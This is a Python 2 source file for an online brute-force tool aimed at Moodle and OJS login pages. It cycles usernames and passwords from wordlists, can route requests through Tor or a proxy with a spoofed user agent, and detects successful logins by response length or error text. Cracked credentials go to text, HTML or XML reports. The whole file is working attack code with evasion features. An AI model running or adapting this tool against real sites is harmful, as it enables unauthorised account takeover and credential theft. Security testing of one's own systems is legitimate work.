import requests # Utilizado para las peticiones
import sys
from lxml.html import fromstring # Utilizado para los enlaces
import os.path
import time
from termcolor import colored
import re # Utilizado para regex
import socket # Tor
import socks # Tor
import random
import time
 
start_time = time.time() #tiempo de ejecucion del programa
def check(url, userField, passField, user, pwd, message,verbose,cookie,agent,proxip,proxport,tor,report):
		
	print colored("\nBeginning BruteForce", 'yellow')
	warning = raw_input('Please check that the arguments you gave to the tool are correct, Do you continue? [Y/n]') or 'Y'
	if 'Y' in warning or 'y' in warning: #Validacion de los parametros de inicio
		pass
	else:
		error = """
Advices to check the arguments:
 * Login: Remember that you only should introduce login part of the URL,e.g.: 
  URL: http://example.com/moodle/login/index.php
  Arguments should be: ./scanner.py -m http://example.com/moodle/ -B login/index.php,username,password,users,pass,'Invalid login'

 * Error message: To check the correct error message showed by the site, you could try the following after one login:
  - OJS: 
	1.- Add at the beginning of the URL the tag "view-source" (without the quotes).
	2.- Look for the form named "pkp_form_error" and inside the element, it would be the error message

  - Moodle:
	1.- Add at the beginning of the URL the tag "view-source" (without the quotes).
	2.- Look for any of these tags: "loginerror" or "loginerrormessage" and next to them it should be the error message
"""
		print colored(error,'green')
		sys.exit(2)
		
	
	b = ['','1','12']
	a = []
	
	proxy = proxip  + ':' + proxport
	proxies = {'http' : proxy, 'https' : proxy,}
	
	
	requests.packages.urllib3.disable_warnings()
	if len(proxy) == 1:
		if tor == True:  # Peticiones a traves de tor
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
			socket.socket = socks.socksocket
			try:
				req = requests.get(url,verify=False)
			except requests.exceptions.ConnectionError:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.RequestException:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.exceptions.Timeout:
				print colored('Too many time waiting for response, please try again','green')
				sys.exit(2)
			except: 
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
		else: #Manejo de errores peticion normal
			try:
				req = requests.get(url,verify=False)
			except requests.exceptions.ConnectionError:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.RequestException:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.exceptions.Timeout:
				print colored('Too many time waiting for response, please try again','green')
				sys.exit(2)
			except:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
	else: # Peticiones a traves de proxy
		try:
			req = requests.get(url,proxies = proxies,verify=False)
		except requests.exceptions.ConnectionError:
			print colored('It can\'t contact with the login page','green')
			sys.exit(2)
		except requests.RequestException:
			print colored('It can\'t contact with the login page','green')
			sys.exit(2)
		except requests.exceptions.Timeout:
			print colored('Too many time waiting for response, please try again','green')
			sys.exit(2)
		except:
			print colored('It can\'t contact with the login page','green')
			sys.exit(2)
				
	if cookie is None: # Obtiene la cookie de sesion
		for key,value in req.headers.iteritems():
			if key.startswith('set-cookie'):
				previous = value.split(';')[0].split('=')
				cookies = {previous[0] : previous[1]}
			else:
				pass
		
		if cookie is None: #cookie aleatoria
			alp = ['a','b','c','d','e','f','g','h','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']
			cook = []
			while len(cook) < 26:
				cook.append(random.choice(alp))
			c =  "".join(str(element) for element in cook)
			cookies = {'Random_Cookie' : c}

	
	else:
		jar = cookie.split(',')
		cookies = {jar[0]:jar[1]}
		
	if agent is None: #User agent por defecto
		agent = 'Mozilla/5.0 (PLAYSTATION 3;3.55)'
		headers = {'user-agent': agent}
	else:
		headers = {'user-agent': agent}

	
	requests.packages.urllib3.disable_warnings()	
	for element in b: # REalizacion de las peticiones para ver que devuelve el sitio
		payload = {userField : element, passField: ''}
		if len(proxy) == 1:
			if tor == True: #Manejo de errores de tor
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
				socket.socket = socks.socksocket
				try:
					
					r = requests.post(url,payload,cookies = cookies, headers = headers,verify=False)
				except requests.exceptions.ConnectionError:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.RequestException:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.exceptions.Timeout:
					print colored('Too many time waiting for response, please try again','green')
					sys.exit(2)
				except:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
			else: #Manejo de errores peticion normal
				try:
					r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
				except requests.exceptions.ConnectionError:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.RequestException:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.exceptions.Timeout:
					print colored('Too many time waiting for response, please try again','green')
					sys.exit(2)
				except:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
		else: #Manejo de errores del proxy
			try:
				r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
				
			except requests.exceptions.ConnectionError:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.RequestException:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.exceptions.Timeout:
				print colored('Too many time waiting for response, please try again','green')
				sys.exit(2)
			except:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
		a.append(len(r.content))
	
	
	if os.path.exists(user): #archivo con usuarios
		print colored('There\'s a file named: ','yellow') + colored(user,'blue') + colored(' as an user argument.','yellow')
		ask = raw_input('Do you want to make the attack with the file? [Y/n]') or 'Y' #Validacion ndel archivo de usuarios como parametro
		if 'Y' in ask or 'y' in ask:
			u = 1
		else:
			u = 0
	else:
		u = 0
	
	if os.path.exists(pwd):
		print colored('There\'s a file named: ','yellow') + colored(pwd,'blue') + colored(' as a password argument.','yellow')
		askp = raw_input('Do you want to make the attack with the file? [Y/n]') or 'Y' #Validacion del archivo de passwords como parametro
		if 'Y' in askp or 'y' in askp:
			p = 1  
		else:
			p = 0
	else:
		p = 0
	
	if u == 1 and p == 1: #Ambos archivos
		doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,a,tor,report)
	elif u == 1 and p == 0 : #Archivo de usuarios
		usersFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,a,tor,report)
	elif u == 0 and p == 1: #Archivo de passwords
		passFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,a,tor,report)
	elif u == 0 and p == 0: #Sin archivos
		single(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,a,tor,report)
	else:
		print colored('Sorry, something is wrong :(','green')
	
		
def single(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,list,tor,report): #Sin archivos
	l = []
	mbefore = message
	requests.packages.urllib3.disable_warnings()		
		
	payload = { userField : user, passField: pwd} # Carga del payload
	
	if len(proxy) == 1:
		if tor == True:  #Manejo de errores de tor
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
			socket.socket = socks.socksocket
			try:
				r = requests.post(url,payload,cookies = cookies, headers = headers,verify=False)
			except requests.exceptions.ConnectionError:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.RequestException:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.exceptions.Timeout:
				print colored('Too many time waiting for response, please try again','green')
				sys.exit(2)
			except:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
		else: #Manejo de errores peticion normal
			try:
				r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
			except requests.exceptions.ConnectionError:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.RequestException:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.exceptions.Timeout:
				print colored('Too many time waiting for response, please try again','green')
				sys.exit(2)
			except:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
	else: #Manejo de errores del proxy
		try:
			r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
		except requests.exceptions.ConnectionError:
			print colored('It can\'t contact with the login page','green')
			sys.exit(2)
		except requests.RequestException:
			print colored('It can\'t contact with the login page','green')
			sys.exit(2)
		except requests.exceptions.Timeout:
			print colored('Too many time waiting for response, please try again','green')
			sys.exit(2)
		except:
			print colored('It can\'t contact with the login page','green')
			sys.exit(2)
	
	
	if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario	
		if int(len(r.content)) - int(len(user)) == list[0] or mbefore in r.content: #Validacion del mensaje de error en la respuesta
			if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
				l.append(user)
				l.append(pwd)
				l.append(':(')
		else:
			if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
				l.append(user)
				l.append(pwd)
				l.append(':)')
	
	
	elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
		if int(len(r.content)) == list[0] or mbefore in r.content: #Validacion del mensaje de error en la respuesta
			if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
				l.append(user)
				l.append(pwd)
				l.append(':(')
				
		else:
			if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
				l.append(user)
				l.append(pwd)
				l.append(':)')
				
	else: # Si no se puede determinar mediante content-lenght
		if mbefore in r.text: #Validacion del mensaje de error en la respuesta
			if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
				l.append(user)
				l.append(pwd)
				l.append(':(')
				
		else:
			if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
				l.append(user)
				l.append(pwd)
				l.append(':)')
				
		
	rep(report,l,url,userField,passField)
		
def usersFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,list,tor,report): #Archivo de usuarios
	l = []
	users = []
	requests.packages.urllib3.disable_warnings()		
	
		
	if os.path.exists(user): #archivo con usuarios
		fo = open(user, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		for i in range(0,len(users)):	
			mbefore = message
				
			#Login
			payload = { userField : users[i].rstrip('\n'), passField: pwd} # Carga del payload
			if len(proxy) == 1:
				if tor == True: #Manejo de errores de tor
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
					socket.socket = socks.socksocket
					try:
						r = requests.post(url,data=payload,cookies = cookies, headers = headers,verify=False)
					except requests.exceptions.ConnectionError:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.RequestException:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.exceptions.Timeout:
						print colored('Too many time waiting for response, please try again','green')
						sys.exit(2)
					except:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
				else: #Manejo de errores peticion normal
					try:
						r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
					except requests.exceptions.ConnectionError:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.RequestException:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.exceptions.Timeout:
						print colored('Too many time waiting for response, please try again','green')
						sys.exit(2)
					except:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
			else: #Manejo de errores del proxy
				try:
					r = requests.post(url,data = payload, cookies = cookies, headers = headers, proxies = proxies,verify=False)
				except requests.exceptions.ConnectionError:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.RequestException:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.exceptions.Timeout:
					print colored('Too many time waiting for response, please try again','green')
					sys.exit(2)
				except:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				
			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(users[i])-1) == list[0] or mbefore in r.content: #Validacion del mensaje de error en la respuesta
					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
						l.append(users[i].rstrip('\n'))
						l.append(pwd)
						l.append(':(')
						
				else:
					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
						l.append(users[i].rstrip('\n'))
						l.append(pwd)
						l.append(':)')
	
			elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
				if int(len(r.content)) == list[0] or mbefore in r.content: #Validacion del mensaje de error en la respuesta
					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
						l.append(users[i].rstrip('\n'))
						l.append(pwd)
						l.append(':(')
						
				else:
					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
						l.append(users[i].rstrip('\n'))
						l.append(pwd)
						l.append(':)')
	
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text: #Validacion del mensaje de error en la respuesta
					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
						l.append(users[i].rstrip('\n'))
						l.append(pwd)
						l.append(':(')
				else:
					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
						l.append(users[i].rstrip('\n'))
						l.append(pwd)
						l.append(':)')
						
	rep(report,l,url,userField,passField)

def passFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,list,tor,report): #Archivo de usuarios
	l = []
	passwords = []
	requests.packages.urllib3.disable_warnings()		
		
	if os.path.exists(pwd): #archivo con passwords
		fo = open(pwd, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(passwords)):
			#Antes del ataque
			mbefore = message
		
			#Login
			payload = { userField : user, passField: passwords[i].rstrip('\n')} # payload
			if len(proxy) == 1:
				if tor == True: #Manejo de errores de tor
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
					socket.socket = socks.socksocket
					try:
						r = requests.post(url,data = payload,cookies = cookies, headers = headers,verify=False)
					except requests.exceptions.ConnectionError:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.RequestException:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.exceptions.Timeout:
						print colored('Too many time waiting for response, please try again','green')
						sys.exit(2)
					except:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
				else: #Manejo de errores peticion normal
					try:
						r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
					except requests.exceptions.ConnectionError:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.RequestException:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.exceptions.Timeout:
						print colored('Too many time waiting for response, please try again','green')
						sys.exit(2)
					except:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
			else: #Manejo de errores del proxy
				try:
					r = requests.post(url,data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
				except requests.exceptions.ConnectionError:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.RequestException:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.exceptions.Timeout:
					print colored('Too many time waiting for response, please try again','green')
					sys.exit(2)
				except:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				
			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(user)) == list[0] or mbefore in r.content: #Validacion del mensaje de error en la respuesta
					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
						l.append(user)
						l.append(passwords[i].rstrip('\n'))
						l.append(':(')
						
				else:
					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
						l.append(user)
						l.append(passwords[i].rstrip('\n'))
						l.append(':)')
						
			
			elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
				if int(len(r.content)) == list[0] or mbefore in r.content: #Validacion del mensaje de error en la respuesta
					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
						l.append(user)
						l.append(passwords[i].rstrip('\n'))
						l.append(':(')
				else:
					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
						l.append(user)
						l.append(passwords[i].rstrip('\n'))
						l.append(':)')
					
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text: #Validacion del mensaje de error en la respuesta
					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3: 
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
						l.append(user)
						l.append(passwords[i].rstrip('\n'))
						l.append(':(')
				else:
					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
						l.append(user)
						l.append(passwords[i].rstrip('\n'))
						l.append(':)')
						
	rep(report, l,url,userField,passField)
	
def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,list,tor,report): # Ambos archivos 
	l = []
	users = []
	passwords = []
	i = 0
	j = 0
	
	requests.packages.urllib3.disable_warnings()		
		
	if os.path.exists(user) and os.path.exists(pwd): # ambos archivos
		
		fo = open(user, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		fo = open(pwd, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			for j in range (0,len(passwords)):
				#Antes del ataque
				mbefore = message
				
				#Login
				
				payload = { userField : users[i].rstrip('\n'), passField: passwords[j].rstrip('\n')}
				if len(proxy) == 1:
					if tor == True: #Manejo de errores de tor
						socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
						socket.socket = socks.socksocket
						try:
							r = requests.post(url,data = payload,cookies = cookies, headers = headers,verify=False)
						except requests.exceptions.ConnectionError:
							print colored('It can\'t contact with the login page','green')
							sys.exit(2)
						except requests.RequestException:
							print colored('It can\'t contact with the login page','green')
							sys.exit(2)
						except requests.exceptions.TimeoutError:
							print colored('Too many time waiting for response, please try again','green')
							sys.exit(2)
						except:
							print colored('It can\'t contact with the login page','green')
							sys.exit(2)
					else: #Manejo de errores peticion normal
						try:
							r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
						except requests.exceptions.ConnectionError:
							print colored('It can\'t contact with the login page','green')
							sys.exit(2)
						except requests.RequestException:
							print colored('It can\'t contact with the login page','green')
							sys.exit(2)
						except requests.exceptions.Timeout:
							print colored('Too many time waiting for response, please try again','green')
							sys.exit(2)
						except:
							print colored('It can\'t contact with the login page','green')
							sys.exit(2)
				else: #Manejo de errores del proxy
					try:
						r = requests.post(url,data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
					except requests.exceptions.ConnectionError:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.RequestException:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.exceptions.TimeoutError:
						print colored('Too many time waiting for response, please try again','green')
						sys.exit(2)
					except:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					
				if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
					if int(len(r.content)) - int(len(users[i])-1) == list[0] or mbefore in r.content: #Validacion del mensaje de error en la respuesta
						if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
							l.append(users[i].rstrip('\n'))
							l.append(passwords[j].rstrip('\n'))
							l.append(':(')
						
						j + 1
					else:
						if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
							l.append(users[i].rstrip('\n'))
							l.append(passwords[j].rstrip('\n'))
							l.append(':)')

						
						j + 1
						
				elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
					if int(len(r.content)) == list[0] or mbefore in r.content: #Validacion del mensaje de error en la respuesta
						if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
							l.append(users[i].rstrip('\n'))
							l.append(passwords[j].rstrip('\n'))
							l.append(':(')
						j + 1
					else:
						if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
							l.append(users[i].rstrip('\n'))
							l.append(passwords[j].rstrip('\n'))
							l.append(':)')
						j + 1	
				else: # Si no se puede determinar mediante content-lenght
					if mbefore in r.text: #Validacion del mensaje de error en la respuesta
						if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
							l.append(users[i].rstrip('\n'))
							l.append(passwords[j].rstrip('\n'))
							l.append(':(')
					else:
						if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')	
							l.append(users[i].rstrip('\n'))
							l.append(passwords[j].rstrip('\n'))
							l.append(':)')
		i + 1	
	rep(report,l,url,userField,passField)

def rep(list1,list2,url,userField,passField): #Reporte
	title = ' *** Bruteforce Results ***'
	execution =  ('Execution time was: %s seconds' % (time.time() - start_time))
	resource = 'Resource: ' + str(url)
	usFi = 'UserField: ' + str(userField)
	passFi = 'PassField: ' + str(passField)
	tries = 'Number of tries: ' + str(len(list2) / 3)
	up = 'User				Pass				Success :), Fail :('
	t = time.strftime('%d-%m-%Y')
	h = time.strftime('%H:%M:%S')
	
	for value in list1:
		if 'text' in value:	#Texto plano
			fo = open(('BruteForceReport_' + t + '_'+ h + '.txt'), 'wb')
			fo.write(title.center(100) + '\n')
			fo.write('' + '\n')
			fo.write(execution.ljust(50) + '\n')
			fo.write('' + '\n')
			fo.write(resource.rjust(50) + '\n')
			fo.write(usFi.ljust(50) + '\n')
			fo.write(passFi.ljust(50) + '\n')
			fo.write(tries.ljust(50) + '\n')
			fo.write('' + '\n')
			fo.write('' + '\n')
			fo.write(up.center(52) + '\n')
			fo.write('--------------------------------------------------------------------------------------------')
			fo.write('' + '\n')
			while len(list2) > 0:
				user = list2[0] 
				pa = list2[1]
				val = list2[2]
				fo.write('	' + user + '				' + pa + '					' + val + '\n')
				list2.pop(2)
				list2.pop(1)
				list2.pop(0)
			fo.close()	
		elif 'html'.upper() in value or 'html' in value: #HTML
			fo = open(('BruteForceReport_' + t + '_'+ h + '.html'), 'wb')
			
			header = """
			<html>
			<head>
			<style>
			table {
				font-family: arial, sans-serif;
				border-collapse: collapse;
				width: 100%;
			}
	
			td, th {
				border: 3px solid #808080;
				text-align: center;
				padding: 8px;
			}

			tr:nth-child(even) {
				background-color: #f8f8ff;
			}
			</style>

				<title>Bruteforce Results</title>
			</head>
			<body text = "B8860B"; link ="B8860B"; bgcolor="00008B">
				<h1 align="center">Bruteforce Results</h1><br><br>
			"""
			fo.write( header)
			fo.write("""<h1 align="left"> %s </h1>""" % execution)
			fo.write("""<h1 align="left"><a href='%s'> %s </a></h1><br>""" % (url,resource))
			fo.write("""<h1 align="left"> %s </h1>""" % usFi)
			fo.write("""<h1 align="left"> %s </h1>""" % passFi)
			fo.write("""<h1 align="left"> %s </h1><br>""" % tries)
			fo.write("""<table>
							<tr>
								<th>User</th>
								<th>Password</th>
								<th>Success :), Fail :(</th>
							</tr>
						""")
			while len(list2) > 0:
				user = list2[0] 
				pa = list2[1]
				val = list2[2]
				fo.write("""
							<tr>
								<th>%s</th>
								<th>%s</th>
								<th>%s</th>
							</tr>
							""" % (user,pa,val))
				list2.pop(2)
				list2.pop(1)
				list2.pop(0)
				
			fo.write("""</table>
			</body>
			</html>""")
			fo.close()
			
		elif 'xml'.upper() in value or 'xml' in value:	#XML
			fo = open(('BruteForceReport_' + t + '_'+ h + '.xml'), 'wb')
			
			fo.write('<?xml version="1.0" encoding="UTF-8"?>' + '\n')
			fo.write('<?xml-stylesheet type="text/css" href="bforce.css"?>' + '\n')
			fo.write('<bruteforce>' + '\n')
			fo.write('	<title>***Bruteforce Results***</title><br />' + '\n')
			fo.write('	<time>%s</time>' % execution + '\n')
			fo.write('	<resource>%s</resource>' % resource + '\n')
			fo.write('	<userField>%s</userField>' % usFi + '\n')
			fo.write('	<passwordField>%s</passwordField>' % passFi + '\n')
			fo.write('	<tries>%s</tries>' % tries + '\n')
			while len(list2) > 0:
				user = list2[0] 
				pa = list2[1]
				val = list2[2]
				fo.write('	<credentials>' + '\n')
				fo.write('		<user>User: %s</user>' % user + '\n')
				fo.write('		<pass>Password: %s</pass>' % pa + '\n')
				fo.write('		<result>Result: %s</result>' % val + '\n')
				fo.write('	</credentials>' + '\n')
				list2.pop(2)
				list2.pop(1)
				list2.pop(0)
			fo.write('</bruteforce>')
			fo.close()


		else:
			pass
